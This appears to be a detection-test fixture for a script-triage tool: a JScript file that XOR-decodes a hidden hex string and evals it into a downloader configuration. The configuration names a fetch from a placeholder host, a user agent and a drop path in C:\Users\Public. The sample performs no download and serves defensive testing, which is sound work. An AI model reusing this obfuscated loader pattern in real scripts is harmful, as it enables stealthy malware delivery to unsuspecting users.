// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_2dd371a3 = function decode_2dd371a3_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ 58); }
  return recoveredMaterial;
};
var recover_0ff69d63 = function recover_0ff69d63_body() {
  // configuration reconstruction
  var packedText = "41:18:49:4e:5f:4a:49:18:00:61:18:5b:59:4b:4f:53:48:5f:65:48:5f:57:55:4e:5f:18:16:18:4d:48:53:4e:5f:65:5c:53:56:5f:18:67:16:18:5b:5e:5b:4a:4e:5f:48:18:00:18:77:53:59:48:55:49:55:5c:4e:14:62:77:76:72:6e:6e:6a:18:16:18:4c:5b:56:4f:5f:49:18:00:41:18:59:5b:57:4a:5b:53:5d:54:65:53:5e:18:00:18:59:5b:57:4a:5b:53:5d:54:17:02:0c:0a:08:0f:0d:09:5e:0a:0d:18:16:18:4f:48:56:18:00:18:52:4e:4e:4a:49:00:15:15:02:0c:0a:08:0f:0d:09:5e:0a:0d:14:5f:42:5b:57:4a:56:5f:14:53:54:4c:5b:56:53:5e:15:0c:5e:0a:0b:0c:5c:5b:0b:14:5e:5b:4e:18:16:18:4f:49:5f:48:65:5b:5d:5f:54:4e:18:00:18:72:4f:54:4e:48:5f:49:49:76:5b:58:15:02:0c:0a:08:0f:0d:09:5e:0a:0d:18:16:18:5c:53:56:5f:65:4a:5b:4e:52:18:00:18:79:00:66:66:6f:49:5f:48:49:66:66:6a:4f:58:56:53:59:66:66:72:4f:54:4e:48:5f:49:49:76:5b:58:66:66:49:4e:5b:5d:5f:17:02:0c:0a:08:0f:0d:09:5e:0a:0d:14:5e:5b:4e:18:47:16:18:49:4e:5b:5d:5f:79:55:4f:54:4e:18:00:08:47";
  var packedParts = packedText.split(":");
  var storedMaterial = [];
  for (var hi = 0; hi < packedParts.length; hi++) { storedMaterial.push(parseInt(packedParts[hi], 16)); }
  var harmlessValue = ["north", "south"].join(":");
  var recoveredMaterial = [];
  var state = 1;
  switch (state) { case 1: recoveredMaterial = decode_2dd371a3.call(null, storedMaterial); break; default: recoveredMaterial = []; }
  var configurationText = "", bi = 0;
  for (bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }
  return configurationText;
  // end reconstruction
};
var inspect_dd1bdfd6 = function inspect_dd1bdfd6_body() {
  var configuration = eval("(" + recover_0ff69d63.call(null) + ")");
  var table = { steps: function() { return configuration["steps"]; }, values: function() { return configuration["values"]; } };
  return { steps: table["steps"].call(null), adapter: configuration["adapter"], values: table["values"].call(null), stageCount: configuration["stageCount"] };
};
